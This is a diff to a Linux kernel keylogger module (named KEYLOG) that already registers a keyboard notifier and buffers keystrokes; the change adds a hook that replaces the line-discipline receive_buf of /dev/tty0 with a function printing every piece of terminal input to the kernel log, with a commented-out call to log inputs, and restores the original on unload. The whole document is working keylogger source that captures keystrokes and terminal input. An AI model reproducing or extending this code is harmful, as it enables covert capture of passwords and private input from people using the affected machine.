@@ -11,6 +11,8 @@
 #include <asm/uaccess.h> /* copy_from/to_user */
 
 #include <linux/keyboard.h> /* register_keyboard_notifier etc */
+#include <linux/tty.h>
+
 #include "keymap.h"
 
 #define print812(...) printk( "<1>812 " ); printk( __VA_ARGS__ ); printk( "\n" );
@@ -24,6 +26,12 @@ MODULE_LICENSE( "Dual BSD/GPL" );
 
 static char *key_buffer;
 static int  cur_buf_length = 0;
+
+static void (*old_receive_buf) (struct tty_struct *tty, const unsigned char *cp,
+                        char *fp, int count);
+struct file *file;
+struct tty_struct *tty;
+
 
 int key_open( struct inode *inode, struct file *filp );
 ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
@@ -58,6 +66,34 @@ ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
     } else {
         return 0;
     }
+}
+
+struct file* file_open(const char* path, int flags, int rights) {
+    struct file* filp = NULL;
+    mm_segment_t oldfs;
+    int err = 0;
+    
+    oldfs = get_fs();
+    set_fs(get_ds());
+    filp = filp_open(path, flags, rights);
+    set_fs(oldfs);
+    if(IS_ERR(filp)) {
+        err = PTR_ERR(filp);
+        return NULL;
+    }
+
+    return filp;
+    
+}
+
+void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, 
+                        char *fp, int count)
+{   
+    printk("%s", cp);
+    //logging(tty, cp, count);    //log inputs
+
+    /* call the original receive_buf */
+    (*old_receive_buf)(tty, cp, fp, count);
 }
 
 int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
@@ -102,6 +138,19 @@ static int hello_init( void ) {
     }
 
     register_keyboard_notifier(&keyboardNotifierBlock);
+    
+    file = file_open("/dev/tty0", O_RDONLY, 0);
+    if(file != NULL)
+    {
+        tty = file->private_data;
+        
+        if((tty != NULL) && (tty->ldisc != NULL) && (tty->ldisc->ops != NULL) &&
+            (tty->ldisc->ops->receive_buf != NULL))
+        {
+            old_receive_buf = tty->ldisc->ops->receive_buf;
+            tty->ldisc->ops->receive_buf = new_receive_buf;
+        }
+    }
 
     return 0;
 }
@@ -110,6 +159,16 @@ static void hello_exit( void ) {
     print812( "Unregistering the module" );
 
     unregister_keyboard_notifier(&keyboardNotifierBlock);
+
+    if(file != NULL)
+    {
+        filp_close(file, NULL);
+    }
+    if((tty != NULL) && (tty->ldisc != NULL) && (tty->ldisc->ops != NULL) && 
+        (tty->ldisc->ops->receive_buf != NULL) && (old_receive_buf != NULL))
+    {
+        tty->ldisc->ops->receive_buf = old_receive_buf;
+    }
 
     unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
 
